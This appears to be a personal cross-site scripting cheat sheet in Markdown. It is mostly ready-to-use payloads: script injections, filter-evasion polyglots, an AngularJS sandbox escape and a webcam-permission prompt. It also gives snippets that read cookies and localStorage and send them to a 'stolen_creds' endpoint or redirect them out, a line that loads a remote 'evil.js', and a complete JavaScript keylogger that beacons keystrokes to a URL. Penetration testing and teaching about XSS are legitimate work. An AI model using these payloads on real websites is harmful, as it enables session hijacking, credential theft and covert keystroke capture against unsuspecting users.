# XSS
## HTML injection (without XSS)
```
<b>hacking</b>
<img src="https://cdn.pixabay.com/photo/2017/03/08/19/39/hacked-2127635__180.png"></img>
```

## Quick snippets
```
<script>alert(123)</script>
“><script>alert(document.cookie)</script>
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
<iframe onload=alert(1)></iframe>
<IMG SRC=/ onerror="alert(1)"></img>
<IMG SRC=/ onerror="alert(JSON.stringify(window.localStorage))"></img>
$.get(encodeURI("http://127.0.0.1:8000/stolen_creds?" + JSON.stringify(window.localStorage)
<iframe frameBorder="0" height="1" width="1" onload=$.getScript("http://127.0.0.1:8000/evil.js")></iframe>foo
<iframe/src=javascript:alert(1)>
<iframe/src=javascript:console.log('foo')>
<iframe/src=http://localhost:8000/evil.html>
```

# Angular JS
```
{{constructor.constructor('alert(1337)')()}}
```

# Ask for webcam permissions
```
<script>
if (navigator.mediaDevices.getUserMedia) {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(function (stream) {
      alert("Thanks for sharing your webcam with the security team!")
    })
    .catch(function (error) {
      alert("We'll get you another way!")
    });
}
</script>
```

# Emoji payload
```
"><script>alert("💻👿😀")</script>
```

# Data extraction
Cookies: `document.cookie`
Domain: `document.domain`
Localstorage: `JSON.stringify(window.localStorage)`

## Extracting from localStorage
Extracting key and subkeys
```
JSON.parse(window.localStorage.getItem('key')).subkey
```

# Data exfiltration
## Post to webhook
Requires jQuery
```
$.get(encodeURI("http://127.0.0.1:8000/stolen_creds?"+JSON.stringify(window.localStorage)))
```

## Via redirect
Simple, but the redirect could give things away (unless in an iframe)
```
window.location.href='http://localhost:8000/steal?'+myPayload
```

# Cheat sheets
* https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
* http://www.xss-payloads.com/payloads-list.html?a#category=all
* https://netsec.expert/posts/xss-in-2021/

# Javascript keylogger
https://github.com/JohnHoder/Javascript-Keylogger/blob/master/keylogger.js
```
var keys='';
var url = 'http://127.0.0.1:8000/keylogger?c=';

document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
}
window.setInterval(function(){
	if(keys.length>0) {
		new Image().src = url+keys;
		keys = '';
	}
}, 1000);
```
# XSS Polyglots
* https://chefsecure.com/courses/xss/recipes/polyglots-the-ultimate-xss-payloads
* https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

# Javascript Payload Sites
http://www.xss-payloads.com/payloads-list.html?a#category=all

# Owasp
https://owasp.org/www-community/xss-filter-evasion-cheatsheet
